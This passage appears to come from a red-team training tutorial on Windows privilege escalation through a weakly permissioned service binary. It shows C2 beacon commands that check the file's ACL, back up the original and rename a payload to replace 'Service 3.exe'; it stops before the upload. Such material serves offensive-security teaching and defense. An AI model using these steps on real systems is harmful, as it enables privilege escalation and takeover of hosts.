```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services\Service 3.exe
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  Modify, Synchronize
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:DUD:AI(A;;0x1301bf;;;BU)(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200
         a9;;;S-1-15-2-2)
```
  

This output shows that _BUILTIN\Users_ have _Modify_ privileges over _Service 3.exe_.  This allows us to overwrite the binary with something else (make sure you take a backup first).
```
beacon> download Service 3.exe
[*] started download of C:\Program Files\Vuln Services\Service 3.exe (5120 bytes)
[*] download of Service 3.exe is complete
```
  

Make a copy of your payload whilst renaming it to Service 3.exe.
```
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
```
